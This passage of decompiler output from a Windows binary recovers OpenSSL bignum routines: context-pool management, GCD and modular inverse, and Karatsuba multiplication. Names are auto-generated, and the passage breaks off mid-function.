_DWORD *__usercall sub_420550@<eax>(int *a1@<esi>, char a2)
{
  int v2; // ecx
  _DWORD *result; // eax
  _DWORD *v4; // ebx
  _DWORD *v5; // edi
  int v6; // edx
  int v7; // [esp+0h] [ebp-4h]

  v2 = a1[3];
  if ( v2 != a1[4] )
  {
    if ( v2 )
    {
      if ( (v2 & 0xF) != 0 )
      {
LABEL_16:
        result = (_DWORD *)(a1[1] + 20 * (v2 & 0xF));
        a1[3] = v2 + 1;
        return result;
      }
      v6 = *(_DWORD *)(a1[1] + 324);
    }
    else
    {
      v6 = *a1;
    }
    a1[1] = v6;
    goto LABEL_16;
  }
  result = sub_4133F0(0x148u);
  v4 = result;
  if ( result )
  {
    v5 = result;
    v7 = 16;
    do
    {
      sub_416880(v5);
      if ( (a2 & 8) != 0 )
        sub_416F20((int)v5, 8);
      v5 += 5;
      --v7;
    }
    while ( v7 );
    v4[80] = a1[2];
    v4[81] = 0;
    if ( *a1 )
    {
      *(_DWORD *)(a1[2] + 324) = v4;
      a1[4] += 16;
      ++a1[3];
    }
    else
    {
      a1[4] += 16;
      ++a1[3];
      *a1 = (int)v4;
    }
    a1[1] = (int)v4;
    a1[2] = (int)v4;
    return v4;
  }
  return result;
}

//----- (00420640) --------------------------------------------------------
int __usercall sub_420640@<eax>(int a1@<edx>, int a2@<esi>)
{
  int v2; // ecx
  int result; // eax

  v2 = *(_DWORD *)(a2 + 12);
  result = ((_BYTE)v2 - 1) & 0xF;
  *(_DWORD *)(a2 + 12) = v2 - a1;
  while ( a1 )
  {
    --a1;
    if ( result )
    {
      --result;
    }
    else
    {
      result = 15;
      *(_DWORD *)(a2 + 4) = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 320);
    }
  }
  return result;
}

//----- (00420670) --------------------------------------------------------
_DWORD *sub_420670()
{
  _DWORD *result; // eax

  result = sub_413430(0x30u);
  if ( result )
  {
    result[2] = 0;
    result[1] = 0;
    *result = 0;
    result[4] = 0;
    result[3] = 0;
    result[5] = 0;
    result[7] = 0;
    result[6] = 0;
  }
  else
  {
    sub_408310(3, 106, 65, (int)"crypto\\bn\\bn_ctx.c", 139);
    return 0;
  }
  return result;
}

//----- (004206C0) --------------------------------------------------------
void __cdecl sub_4206C0(void **Block)
{
  if ( Block )
  {
    sub_413490(Block[5]);
    Block[5] = 0;
    sub_4204F0(Block);
    sub_413490(Block);
  }
}

//----- (00420700) --------------------------------------------------------
int __cdecl sub_420700(int *a1)
{
  int v1; // eax
  int result; // eax

  v1 = a1[9];
  if ( v1 || a1[10] )
  {
    result = v1 + 1;
    a1[9] = result;
  }
  else
  {
    result = sub_420460((int)(a1 + 5), a1[8]);
    if ( !result )
    {
      result = sub_408310(3, 129, 109, (int)"crypto\\bn\\bn_ctx.c", 189);
      ++a1[9];
    }
  }
  return result;
}

//----- (00420750) --------------------------------------------------------
int __cdecl sub_420750(_DWORD *a1)
{
  int v1; // eax
  int result; // eax
  unsigned int v3; // edx
  unsigned int v4; // edi

  v1 = a1[9];
  if ( v1 )
  {
    result = v1 - 1;
    a1[9] = result;
  }
  else
  {
    result = --a1[6];
    v3 = a1[8];
    v4 = *(_DWORD *)(a1[5] + 4 * result);
    if ( v4 < v3 )
      result = sub_420640(v3 - v4, (int)a1);
    a1[8] = v4;
    a1[10] = 0;
  }
  return result;
}

//----- (00420790) --------------------------------------------------------
_DWORD *__cdecl sub_420790(int *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // edi

  if ( a1[9] || a1[10] )
    return 0;
  v1 = sub_420550(a1, a1[11]);
  v2 = v1;
  if ( v1 )
  {
    sub_417490(v1, 0);
    ++a1[8];
    return v2;
  }
  else
  {
    a1[10] = 1;
    sub_408310(3, 116, 109, (int)"crypto\\bn\\bn_ctx.c", 225);
    return 0;
  }
}

//----- (004207F0) --------------------------------------------------------
int *__fastcall sub_4207F0(int a1, int *a2)
{
  int *v2; // edi
  int v4; // ebx
  int v5; // eax
  int *v6; // eax

  v2 = (int *)a1;
  v4 = 0;
  if ( sub_416DB0(a1) )
    return a2;
  do
  {
    if ( sub_416E20((int)a2) )
    {
      if ( sub_416E20((int)v2) )
      {
        if ( !sub_422020(a2, (int)a2, (int)v2) )
          return 0;
LABEL_8:
        v5 = sub_437B50(a2, a2);
      }
      else
      {
        v5 = sub_437B50(v2, v2);
      }
      if ( !v5 )
        return 0;
      if ( sub_4169B0(a2, v2) < 0 )
      {
        v6 = a2;
        a2 = v2;
        v2 = v6;
      }
      continue;
    }
    if ( sub_416E20((int)v2) )
      goto LABEL_8;
    if ( !sub_437B50(a2, a2) || !sub_437B50(v2, v2) )
      return 0;
    ++v4;
  }
  while ( !sub_416DB0((int)v2) );
  if ( v4 && !sub_437C10(a2, a2, v4) )
    return 0;
  return a2;
}

//----- (004208C0) --------------------------------------------------------
void **__usercall sub_4208C0@<eax>(int *a1@<esi>, void **a2, _DWORD *a3, int *a4)
{
  unsigned int **v4; // ebx
  int *v5; // edi
  _DWORD *v6; // ebp
  void **v7; // eax
  unsigned int **v8; // ebp
  int *v9; // edi
  _DWORD *v10; // eax
  int *v12; // [esp+0h] [ebp-40h]
  void **Block; // [esp+10h] [ebp-30h]
  int v14; // [esp+14h] [ebp-2Ch]
  unsigned int **v15; // [esp+18h] [ebp-28h]
  int *v16; // [esp+1Ch] [ebp-24h]
  int v17; // [esp+20h] [ebp-20h]
  unsigned int **v18; // [esp+24h] [ebp-1Ch]
  _DWORD v19[5]; // [esp+2Ch] [ebp-14h] BYREF

  Block = 0;
  sub_420700(v12);
  v4 = (unsigned int **)sub_420790(a1);
  v5 = sub_420790(a1);
  v15 = (unsigned int **)sub_420790(a1);
  v18 = (unsigned int **)sub_420790(a1);
  v16 = sub_420790(a1);
  v6 = sub_420790(a1);
  v14 = (int)v6;
  if ( sub_420790(a1) )
  {
    v7 = a2;
    if ( !a2 )
      v7 = (void **)sub_4168C0();
    Block = v7;
    if ( v7 )
    {
      sub_417490(v15, 1);
      sub_417490(v6, 0);
      if ( sub_4173E0(v5, a3) )
      {
        if ( sub_4173E0(v4, a4) )
        {
          if ( (v4[3] = 0, !v5[3]) && sub_416960(v5, (int *)v4) < 0
            || (sub_416880(v19), sub_416E80(v19, v5, 4), sub_42A2D0(v5, v19, (int *)v4, a1)) )
          {
            v17 = -1;
            if ( sub_416DB0((int)v5) )
            {
LABEL_16:
              v9 = a4;
              if ( sub_422020(v6, (int)a4, (int)v6) )
              {
LABEL_19:
                if ( sub_416DC0((int)v4) )
                {
                  if ( v6[3] || sub_416960(v6, v9) >= 0 )
                    v10 = (_DWORD *)sub_42A2D0(Block, v6, v9, a1);
                  else
                    v10 = sub_4173E0(Block, v6);
                  if ( v10 )
                  {
                    sub_420750(a1);
                    return Block;
                  }
                }
                else
                {
                  sub_408310(3, 139, 108, (int)"crypto\\bn\\bn_gcd.c", 610);
                }
              }
            }
            else
            {
              while ( 1 )
              {
                sub_416880(v19);
                sub_416E80(v19, v4, 4);
                if ( !sub_4299A0(v18, (int)v16, v19, v5, a1) )
                  break;
                v8 = v4;
                v4 = (unsigned int **)v5;
                v5 = v16;
                if ( !sub_421C20(v8, v18, v15, a1) || !sub_4220E0(v8, (int)v8, v14) )
                  break;
                v16 = (int *)v14;
                v14 = (int)v15;
                v15 = v8;
                v17 = -v17;
                if ( sub_416DB0((int)v5) )
                {
                  v6 = (_DWORD *)v14;
                  if ( v17 < 0 )
                    goto LABEL_16;
                  v9 = a4;
                  goto LABEL_19;
                }
              }
            }
          }
        }
      }
    }
  }
  if ( !a2 )
    sub_417060(Block);
  sub_420750(a1);
  return 0;
}
// 4208D8: variable 'v12' is possibly undefined
// 4208C0: using guessed type _DWORD var_14[5];

//----- (00420B60) --------------------------------------------------------
int __cdecl sub_420B60(_DWORD *a1, _DWORD *a2, _DWORD *a3, int *a4)
{
  int v4; // ebp
  int *v5; // esi
  int *v6; // eax
  int *v7; // edi
  int *v8; // eax
  int *v9; // eax

  v4 = 0;
  sub_420700(a4);
  v5 = sub_420790(a4);
  v6 = sub_420790(a4);
  v7 = v6;
  if ( v5 && v6 && sub_4173E0(v5, a2) && sub_4173E0(v7, a3) )
  {
    v5[3] = 0;
    v7[3] = 0;
    if ( sub_4169B0(v5, v7) < 0 )
    {
      v8 = v5;
      v5 = v7;
      v7 = v8;
    }
    v9 = sub_4207F0((int)v7, v5);
    if ( v9 && sub_4173E0(a1, v9) )
      v4 = 1;
  }
  sub_420750(a4);
  return v4;
}

//----- (00420C00) --------------------------------------------------------
void **__cdecl sub_420C00(void **a1, _DWORD *a2, int *a3, int *a4, _DWORD *a5)
{
  int *v5; // edi
  unsigned int **v6; // esi
  int *v7; // ebp
  unsigned int **v8; // ebx
  void **v9; // eax
  int *v10; // eax
  int v11; // edi
  int v12; // edi
  int v13; // ebx
  int v15; // eax
  int v16; // edi
  int v17; // eax
  int **v18; // edi
  int v19; // eax
  int v20; // eax
  int *v21; // esi
  int *v22; // ebx
  _DWORD *v23; // eax
  int *v24; // [esp+0h] [ebp-20h]
  int *v25; // [esp+4h] [ebp-1Ch]
  int *v26; // [esp+8h] [ebp-18h]
  void **Block; // [esp+Ch] [ebp-14h]
  int **v28; // [esp+10h] [ebp-10h]
  int v29; // [esp+14h] [ebp-Ch]
  int v30; // [esp+1Ch] [ebp-4h]

  Block = 0;
  if ( a5 )
    *a5 = 0;
  if ( sub_416F30((int)a2, 4) || sub_416F30((int)a3, 4) )
    return sub_4208C0(a4, a1, a2, a3);
  v5 = a4;
  sub_420700(a4);
  v25 = sub_420790(a4);
  v6 = (unsigned int **)sub_420790(a4);
  v24 = sub_420790(a4);
  v7 = sub_420790(a4);
  v8 = (unsigned int **)sub_420790(a4);
  v26 = sub_420790(a4);
  v28 = (int **)sub_420790(a4);
  if ( !v28 )
    goto LABEL_33;
  v9 = a1;
  if ( !a1 )
    v9 = (void **)sub_4168C0();
  Block = v9;
  if ( !v9 )
    goto LABEL_33;
  sub_417490(v24, 1);
  sub_417490(v26, 0);
  if ( !sub_4173E0(v6, a2) || !sub_4173E0(v25, a3) )
    goto LABEL_33;
  v10 = v25;
  v25[3] = 0;
  if ( v6[3] )
    goto LABEL_14;
  if ( sub_416960(v6, v25) >= 0 )
  {
    v10 = v25;
LABEL_14:
    if ( !sub_42A2D0(v6, v6, v10, a4) )
      goto LABEL_33;
  }
  v29 = -1;
  if ( sub_416E20((int)a3) && sub_416F90(a3) <= 2048 )
  {
    if ( sub_416DB0((int)v6) )
      goto LABEL_78;
    while ( 1 )
    {
      v11 = 0;
      if ( !sub_416A50(v6, 0) )
        break;
LABEL_25:
      v12 = 0;
      if ( !sub_416A50(v25, 0) )
      {
        while ( 1 )
        {
          v13 = (int)v26;
          ++v12;
          if ( sub_416E20((int)v26) )
          {
            if ( !sub_421EA0((int)v26, (int)v26, (int)a3) )
              goto LABEL_32;
          }
          if ( !sub_437B50(v26, v26) )
            goto LABEL_32;
          if ( sub_416A50(v25, v12) )
          {
            if ( v12 <= 0 || sub_437D40((unsigned int **)v25, (unsigned int **)v25, v12) )
              goto LABEL_37;
            goto LABEL_32;
          }
        }
      }
      v13 = (int)v26;
LABEL_37:
      if ( sub_416960(v6, v25) < 0 )
      {
        if ( !sub_421EA0(v13, v13, (int)v24) )
          goto LABEL_32;
        v15 = sub_421F50(v25, (int)v25, (int)v6);
      }
      else
      {
        if ( !sub_421EA0((int)v24, (int)v24, v13) )
          goto LABEL_32;
        v15 = sub_421F50(v6, (int)v6, (int)v25);
      }
      if ( !v15 )
        goto LABEL_32;
      if ( sub_416DB0((int)v6) )
        goto LABEL_77;
    }
    while ( 1 )
    {
      ++v11;
      if ( sub_416E20((int)v24) )
      {
        if ( !sub_421EA0((int)v24, (int)v24, (int)a3) )
          break;
      }
      if ( !sub_437B50(v24, v24) )
        break;
      if ( sub_416A50(v6, v11) )
      {
        if ( v11 > 0 && !sub_437D40(v6, v6, v11) )
          break;
        goto LABEL_25;
      }
    }
LABEL_32:
    v5 = a4;
    goto LABEL_33;
  }
  if ( sub_416DB0((int)v6) )
    goto LABEL_78;
  do
  {
    v16 = sub_416F90(v6);
    if ( sub_416F90(v25) == v16 )
    {
      if ( !sub_417490(v7, 1) )
        goto LABEL_32;
LABEL_48:
      v17 = sub_422020(v8, (int)v25, (int)v6);
      goto LABEL_61;
    }
    v30 = sub_416F90(v6) + 1;
    if ( sub_416F90(v25) == v30 )
    {
      if ( !sub_437AC0(v28, (int **)v6) )
        goto LABEL_32;
      if ( sub_416960(v25, (int *)v28) < 0 )
      {
        if ( !sub_417490(v7, 1) )
          goto LABEL_32;
        goto LABEL_48;
      }
      if ( !sub_422020(v8, (int)v25, (int)v28) || !sub_4220E0(v7, (int)v28, (int)v6) )
        goto LABEL_32;
      if ( sub_416960(v25, v7) >= 0 )
      {
        if ( !sub_417490(v7, 3) )
          goto LABEL_32;
        v17 = sub_422020(v8, (int)v8, (int)v6);
      }
      else
      {
        v17 = sub_417490(v7, 2);
      }
    }
    else
    {
      v17 = sub_4299A0(v7, (int)v8, v25, (int *)v6, a4);
    }
LABEL_61:
    if ( !v17 )
      goto LABEL_32;
    v18 = (int **)v25;
    v25 = (int *)v6;
    v6 = v8;
    if ( sub_416DC0((int)v7) )
    {
      v19 = sub_4220E0(v18, (int)v24, (int)v26);
    }
    else
    {
      if ( sub_416DE0((int)v7, 2) )
      {
        v20 = sub_437AC0(v18, (int **)v24);
      }
      else if ( sub_416DE0((int)v7, 4) )
      {
        v20 = sub_437C10(v18, v24, 2);
      }
      else if ( v7[1] == 1 )
      {
        if ( !sub_4173E0(v18, v24) )
          goto LABEL_32;
        v20 = sub_438150((unsigned int **)v18, *(_DWORD *)*v7);
      }
      else
      {
        v20 = sub_421C20((unsigned int **)v18, (unsigned int **)v7, (unsigned int **)v24, a4);
      }
      if ( !v20 )
        goto LABEL_32;
      v19 = sub_4220E0(v18, (int)v18, (int)v26);
    }
    if ( !v19 )
      goto LABEL_32;
    v8 = (unsigned int **)v26;
    v26 = v24;
    v24 = (int *)v18;
    v29 = -v29;
  }
  while ( !sub_416DB0((int)v6) );
  if ( v29 >= 0 )
  {
    v5 = a4;
    v21 = v26;
    v22 = a3;
    goto LABEL_81;
  }
LABEL_77:
  v5 = a4;
LABEL_78:
  v21 = v26;
  v22 = a3;
  if ( sub_422020(v26, (int)a3, (int)v26) )
  {
LABEL_81:
    if ( sub_416DC0((int)v25) )
    {
      if ( v21[3] || sub_416960(v21, v22) >= 0 )
        v23 = (_DWORD *)sub_42A2D0(Block, v21, v22, v5);
      else
        v23 = sub_4173E0(Block, v21);
      if ( v23 )
      {
        sub_420750(v5);
        return Block;
      }
    }
    else if ( a5 )
    {
      *a5 = 1;
    }
  }
LABEL_33:
  if ( !a1 )
    sub_417060(Block);
  sub_420750(v5);
  return 0;
}

//----- (004211F0) --------------------------------------------------------
void **__cdecl sub_4211F0(void **a1, _DWORD *a2, int *a3, int *a4)
{
  void **result; // eax
  void **v5; // esi
  int v6; // [esp+4h] [ebp-4h] BYREF

  result = sub_420C00(a1, a2, a3, a4, &v6);
  v5 = result;
  if ( v6 )
  {
    sub_408310(3, 110, 108, (int)"crypto\\bn\\bn_gcd.c", 131);
    return v5;
  }
  return result;
}

//----- (00421250) --------------------------------------------------------
int __cdecl sub_421250(_DWORD *a1, unsigned int *a2, int a3, unsigned int *a4, int a5)
{
  int v5; // esi
  int v6; // edi
  unsigned int *v7; // ecx
  unsigned int *v8; // eax
  int result; // eax
  int v10; // esi
  int *v11; // ebx
  unsigned int *v12; // ebp
  int v13; // esi
  int v14; // esi
  int v15; // esi
  unsigned int *v16; // [esp+18h] [ebp+Ch]

  v5 = a5;
  v6 = a3;
  if ( a3 >= a5 )
  {
    v8 = a2;
  }
  else
  {
    v7 = a2;
    v6 = a5;
    v5 = a3;
    v8 = a4;
    a2 = a4;
    a4 = v7;
  }
  if ( v5 <= 0 )
    return sub_4384B0(a1, v8, v6, 0);
  result = sub_4384B0(a1, v8, v6, *a4);
  v10 = v5 - 1;
  a1[v6] = result;
  if ( v10 > 0 )
  {
    v11 = &a1[v6 + 2];
    v12 = a1 + 2;
    v16 = a4 + 2;
    do
    {
      result = sub_4381C0(v12 - 1, a2, v6, *(v16 - 1));
      v13 = v10 - 1;
      *(v11 - 1) = result;
      if ( v13 <= 0 )
        break;
      result = sub_4381C0(v12, a2, v6, *v16);
      v14 = v13 - 1;
      *v11 = result;
      if ( v14 <= 0 )
        break;
      result = sub_4381C0(v12 + 1, a2, v6, v16[1]);
      v15 = v14 - 1;
      v11[1] = result;
      if ( v15 <= 0 )
        break;
      result = sub_4381C0(v12 + 2, a2, v6, v16[2]);
      v16 += 4;
      v11[2] = result;
      v10 = v15 - 1;
      v11 += 4;
      v12 += 4;
    }
    while ( v10 > 0 );
  }
  return result;
}

//----- (00421370) --------------------------------------------------------
unsigned int __cdecl sub_421370(
        unsigned int *a1,
        unsigned int *a2,
        unsigned int *a3,
        int a4,
        int a5,
        int a6,
        unsigned int *a7)
{
  int v7; // esi
  int v8; // ebx
  int v9; // ebp
  unsigned int result; // eax
  int v11; // edi
  unsigned int *v12; // ecx
  unsigned int *v13; // edx
  int v14; // eax
  unsigned int *v15; // ebx
  unsigned int *v16; // ebp
  unsigned int v17; // edi
  unsigned int v18; // edi
  int v19; // esi
  unsigned int v20; // eax
  unsigned int *v21; // ebp
  unsigned int v22; // eax
  bool v23; // zf
  int v24; // [esp+10h] [ebp-18h]
  unsigned int *v25; // [esp+10h] [ebp-18h]
  int v26; // [esp+10h] [ebp-18h]
  unsigned int *v27; // [esp+14h] [ebp-14h]
  unsigned int *v28; // [esp+18h] [ebp-10h]
  int v29; // [esp+1Ch] [ebp-Ch]
  int v30; // [esp+20h] [ebp-8h]
  unsigned int v31; // [esp+40h] [ebp+18h]

  v7 = a4 / 2;
  v8 = a4 / 2 + a5;
  v9 = a4 / 2 + a6;
  if ( a4 == 8 )
  {
    if ( !a5 && !a6 )
      return (unsigned int)sub_439100(a1, a2, a3);
    goto LABEL_6;
  }
  if ( a4 < 16 )
  {
LABEL_6:
    sub_421250(a1, a2, a4 + a5, a3, a4 + a6);
    result = a5 + a6;
    if ( a5 + a6 < 0 )
      return (unsigned int)memset(&a1[2 * a4 + a6 + a5], 0, -4 * result);
    return result;
  }
  v30 = -a5;
  v28 = &a2[v7];
  v11 = sub_416AE0((int)a2, (int)v28, v7 + a5, -a5);
  v29 = 0;
  v24 = 0;
  v27 = &a3[v7];
  switch ( sub_416AE0((int)v27, (int)a3, v9, v9 - v7) + 3 * v11 )
  {
    case -4:
      sub_438B50(a7, v28, a2, v8, v8 - v7);
      v12 = &a3[v7];
      v13 = a3;
      v14 = v7 - v9;
      goto LABEL_14;
    case -3:
    case -1:
    case 0:
    case 1:
    case 3:
      v24 = 1;
      break;
    case -2:
      sub_438B50(a7, v28, a2, v8, v8 - v7);
      sub_438B50(&a7[v7], v27, a3, v9, v9 - v7);
      v29 = 1;
      break;
    case 2:
      sub_438B50(a7, a2, v28, v8, v30);
      sub_438B50(&a7[v7], a3, v27, v9, v7 - v9);
      v29 = 1;
      break;
    case 4:
      sub_438B50(a7, a2, v28, v8, v30);
      v14 = v9 - v7;
      v12 = a3;
      v13 = &a3[v7];
LABEL_14:
      sub_438B50(&a7[v7], v13, v12, v9, v14);
      break;
    default:
      break;
  }
  if ( v7 != 4 )
  {
    if ( v7 == 8 && !a5 && !a6 )
    {
      v15 = &a7[a4];
      if ( v24 )
        memset(v15, 0, 0x40u);
      else
        sub_439100(v15, a7, a7 + 8);
      v16 = a1;
      sub_439100(a1, a2, a3);
      v25 = &a1[a4];
      sub_439100(v25, a2 + 8, a3 + 8);
      goto LABEL_33;
    }
    goto LABEL_29;
  }
  if ( a5 || a6 )
  {
LABEL_29:
    if ( v24 )
    {
      v15 = &a7[a4];
      v26 = a4;
      memset(v15, 0, 4 * a4);
    }
    else
    {
      v26 = a4;
      v15 = &a7[a4];
      sub_421370(v15, a7, &a7[v7], v7, 0, 0, &a7[2 * a4]);
    }
    v16 = a1;
    sub_421370(a1, a2, a3, v7, 0, 0, &a7[2 * a4]);
    v25 = &a1[v26];
    sub_421370(v25, v28, v27, v7, a5, a6, &a7[2 * a4]);
    goto LABEL_33;
  }
  v15 = &a7[a4];
  if ( v24 )
  {
    *v15 = 0;
    v15[1] = 0;
    v15[2] = 0;
    v15[3] = 0;
    v15[4] = 0;
    v15[5] = 0;
    v15[6] = 0;
    v15[7] = 0;
  }
  else
  {
    sub_439550(v15, a7, a7 + 4);
  }
  v16 = a1;
  sub_439550(a1, a2, a3);
  v25 = &a1[a4];
  sub_439550(v25, a2 + 4, a3 + 4);
LABEL_33:
  v31 = sub_4387D0((int *)a7, v16, v25, a4);
  if ( v29 )
    v17 = v31 - sub_438990(v15, a7, v15, a4);
  else
    v17 = sub_4387D0((int *)v15, v15, a7, a4) + v31;
  result = sub_4387D0((int *)&v16[v7], &v16[v7], v15, a4);
  v18 = result + v17;
  if ( v18 )
  {
    v19 = a4 + v7;
    v20 = v16[v19];
    v21 = &v16[v19];
    result = v18 + v20;
    *v21 = result;
    if ( result < v18 )
    {
      do
      {
        v22 = v21[1];
        ++v21;
        v23 = v22 == -1;
        result = v22 + 1;
        *v21 = result;
      }
      while ( v23 );
    }
  }
  return result;
}

//----- (004217C0) --------------------------------------------------------
unsigned int *__cdecl sub_4217C0(
        unsigned int *a1,
        unsigned int *a2,
        unsigned int *a3,
        int a4,
        int a5,
        int a6,
        unsigned int *a7)
{
  unsigned int *result; // eax
  int v9; // ebp
  unsigned int *v10; // eax
  unsigned int *v11; // ecx
  int v12; // edx
  int v13; // eax
  int v14; // ecx
  int v15; // ecx
  int v16; // eax
  unsigned int v17; // edi
  unsigned int v18; // edi
  char *v19; // edi
  char *v20; // ecx
  unsigned int v21; // ecx
  int v22; // [esp-10h] [ebp-30h]
  unsigned int *v23; // [esp+4h] [ebp-1Ch]
  unsigned int *v24; // [esp+8h] [ebp-18h]
  unsigned int *v25; // [esp+Ch] [ebp-14h]
  int Size; // [esp+10h] [ebp-10h]
  int Sizea; // [esp+10h] [ebp-10h]
  int v28; // [esp+14h] [ebp-Ch]
  unsigned int *v29; // [esp+14h] [ebp-Ch]
  int v30; // [esp+18h] [ebp-8h]
  int v31; // [esp+1Ch] [ebp-4h]
  unsigned int *v32; // [esp+30h] [ebp+10h]

  if ( a4 < 8 )
    return (unsigned int *)sub_421250(a1, a2, a5 + a4, a3, a4 + a6);
  v28 = a4 - a5;
  v23 = &a2[a4];
  v9 = sub_416AE0((int)a2, (int)v23, a5, a4 - a5);
  v30 = 0;
  Size = a6 - a4;
  v32 = &a3[a4];
  switch ( sub_416AE0((int)&a3[a4], (int)a3, a6, a6 - a4) + 3 * v9 )
  {
    case -4:
      sub_438B50(a7, v23, a2, a5, a5 - a4);
      v10 = v32;
      v11 = a3;
      v12 = a4 - a6;
      goto LABEL_8;
    case -3:
    case -2:
      sub_438B50(a7, v23, a2, a5, a5 - a4);
      sub_438B50(&a7[a4], v32, a3, a6, Size);
      v30 = 1;
      break;
    case -1:
    case 0:
    case 1:
    case 2:
      sub_438B50(a7, a2, v23, a5, v28);
      sub_438B50(&a7[a4], a3, v32, a6, a4 - a6);
      v30 = 1;
      break;
    case 3:
    case 4:
      sub_438B50(a7, a2, v23, a5, v28);
      v12 = Size;
      v10 = a3;
      v11 = v32;
LABEL_8:
      sub_438B50(&a7[a4], v11, v10, a6, v12);
      break;
    default:
      break;
  }
  if ( a4 == 8 )
  {
    v29 = a7 + 16;
    sub_439100(a7 + 16, a7, a7 + 8);
    sub_439100(a1, a2, a3);
    v24 = a1 + 16;
    sub_421250(a1 + 16, a2 + 8, a5, a3 + 8, a6);
    memset(&a1[a6 + 16 + a5], 0, 4 * (16 - a5 - a6));
  }
  else
  {
    v25 = &a7[4 * a4];
    Sizea = 2 * a4;
    v29 = &a7[2 * a4];
    sub_421370(v29, a7, &a7[a4], a4, 0, 0, v25);
    sub_421370(a1, a2, a3, a4, 0, 0, v25);
    v13 = a4 / 2;
    v31 = a4 / 2;
    v14 = a5;
    if ( a5 <= a6 )
      v14 = a6;
    v15 = v14 - v13;
    if ( v15 )
    {
      if ( v15 <= 0 )
      {
        v24 = &a1[Sizea];
        memset(&a1[Sizea], 0, Sizea * 4);
        if ( a5 >= 16 || a6 >= 16 )
        {
          v16 = v31 / 2;
          if ( v31 / 2 >= a5 )
          {
            while ( v16 >= a6 )
            {
              if ( v16 == a5 || v16 == a6 )
              {
                sub_421370(v24, v23, v32, v16, a5 - v16, a6 - v16, v25);
                goto LABEL_26;
              }
              v16 /= 2;
              if ( v16 < a5 )
                break;
            }
          }
          sub_4217C0(v24, v23, v32, v16, a5 - v16, a6 - v16, v25);
        }
        else
        {
          sub_421250(v24, v23, a5, v32, a6);
        }
      }
      else
      {
        v24 = &a1[Sizea];
        sub_4217C0(&a1[Sizea], v23, v32, a4 / 2, a5 - v13, a6 - v13, v25);
        memset(&a1[2 * a4 + a6 + a5], 0, 4 * (2 * a4 - a5 - a6));
      }
    }
    else
    {
      v24 = &a1[Sizea];
      sub_421370(&a1[Sizea], v23, v32, a4 / 2, a5 - v13, a6 - v13, v25);
      memset(&a1[2 * a4 + 2 * v31], 0, Sizea * 4 - 8 * v31);
    }
  }
LABEL_26:
  v17 = sub_4387D0((int *)a7, a1, v24, 2 * a4);
  v22 = 2 * a4;
  if ( v30 )
    v18 = v17 - sub_438990(v29, a7, v29, v22);
  else
    v18 = sub_4387D0((int *)v29, v29, a7, v22) + v17;
  result = (unsigned int *)sub_4387D0((int *)&a1[a4], &a1[a4], v29, 2 * a4);
  v19 = (char *)result + v18;
  if ( v19 )
  {
    result = &a1[3 * a4];
    v20 = &v19[*result];
    *result = (unsigned int)v20;
    if ( v20 < v19 )
    {
      do
      {
        v21 = result[1];
        *++result = v21 + 1;
      }
      while ( v21 == -1 );
    }
  }
  return result;
}

//----- (00421C20) --------------------------------------------------------
int __cdecl sub_421C20(unsigned int **a1, unsigned int **a2, unsigned int **a3, int *a4)
{
  int v4; // ebx
  int v5; // edi
  unsigned int **v6; // ebp
  int v7; // esi
  int v8; // esi
  unsigned int **v9; // eax
  char v11; // [esp+Ch] [ebp-10h]
  unsigned int **v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h]

  v4 = (int)a3[1];
  v5 = (int)a2[1];
  v14 = 0;
  v11 = 0;
  if ( v5 && v4 )
  {
    v13 = v4 + v5;
    sub_420700(a4);
    if ( a1 == a2 || a1 == a3 )
    {
      v6 = (unsigned int **)sub_420790(a4);
      if ( !v6 )
        goto LABEL_32;
    }
    else
    {
      v6 = a1;
    }
    v7 = v5 - v4;
    v6[3] = (unsigned int *)((unsigned int)a3[3] ^ (unsigned int)a2[3]);
    if ( v5 == v4 && v5 == 8 )
    {
      if ( sub_4173C0((int)v6, 16) )
      {
        v6[1] = (unsigned int *)16;
        sub_439100(*v6, *a2, *a3);
LABEL_29:
        sub_416F60(v6);
        if ( a1 != v6 )
          sub_4173E0(a1, v6);
        v14 = 1;
      }
    }
    else if ( v5 < 16 || v4 < 16 || (unsigned int)(v7 + 1) > 2 )
    {
      if ( sub_4173C0((int)v6, v13) )
      {
        v6[1] = (unsigned int *)v13;
        sub_421250(*v6, *a2, v5, *a3, v4);
        goto LABEL_29;
      }
    }
    else
    {
      if ( v7 >= 0 )
        v11 = sub_416830(v5);
      if ( v7 == -1 )
        v11 = sub_416830(v4);
      v8 = 1 << (v11 - 1);
      v9 = (unsigned int **)sub_420790(a4);
      v12 = v9;
      if ( !v9 )
        goto LABEL_32;
      if ( v5 > v8 || v4 > v8 )
      {
        if ( sub_4173C0((int)v9, 8 * v8) && sub_4173C0((int)v6, 8 * v8) )
        {
          sub_4217C0(*v6, *a2, *a3, v8, v5 - v8, v4 - v8, *v12);
          v6[1] = (unsigned int *)v13;
          goto LABEL_29;
        }
      }
      else if ( sub_4173C0((int)v9, 4 * v8) && sub_4173C0((int)v6, 4 * v8) )
      {
        sub_421370(*v6, *a2, *a3, v8, v5 - v8, v4 - v8, *v12);
        v6[1] = (unsigned int *)v13;
        goto LABEL_29;
      }
    }
LABEL_32:
    sub_420750(a4);
    return v14;
  }
  sub_417490(a1, 0);
  return 1;
}

//----- (00421EA0) --------------------------------------------------------
int __cdecl sub_421EA0(int a1, int a2, int a3)
{
  int v3; // eax
  int v4; // edi
  int v5; // esi
  int v6; // ebp
  int v7; // ebx
  int result; // eax
  unsigned int *v9; // edi
  int *v10; // esi
  unsigned int v11; // eax
  unsigned int *v12; // esi
  unsigned int *v13; // edi
  unsigned int v14; // ebp
  int v15; // [esp+18h] [ebp+8h]

  v3 = a3;
  v4 = a2;
  if ( *(_DWORD *)(a2 + 4) < *(_DWORD *)(a3 + 4) )
  {
    v4 = a3;
    a3 = a2;
    v3 = a2;
  }
  v5 = *(_DWORD *)(v4 + 4);
  v6 = a1;
  v15 = *(_DWORD *)(v3 + 4);
  v7 = v5 - v15;
  result = (int)sub_4173C0(a1, v5 + 1);
  if ( result )
  {
    *(_DWORD *)(a1 + 4) = v5;
    v9 = *(unsigned int **)v4;
    v10 = *(int **)a1;
    v11 = sub_4387D0(*(int **)a1, v9, *(unsigned int **)a3, v15);
    v12 = (unsigned int *)&v10[v15];
    v13 = &v9[v15];
    if ( v7 )
    {
      do
      {
        v14 = *v13 + v11;
        --v7;
        ++v13;
        *v12++ = v14;
        v11 = (v14 == 0) & (unsigned __int8)v11;
      }
      while ( v7 );
      v6 = a1;
    }
    *v12 = v11;
    *(_DWORD *)(v6 + 4) += v11;
    *(_DWORD *)(v6 + 12) = 0;
    return 1;
  }
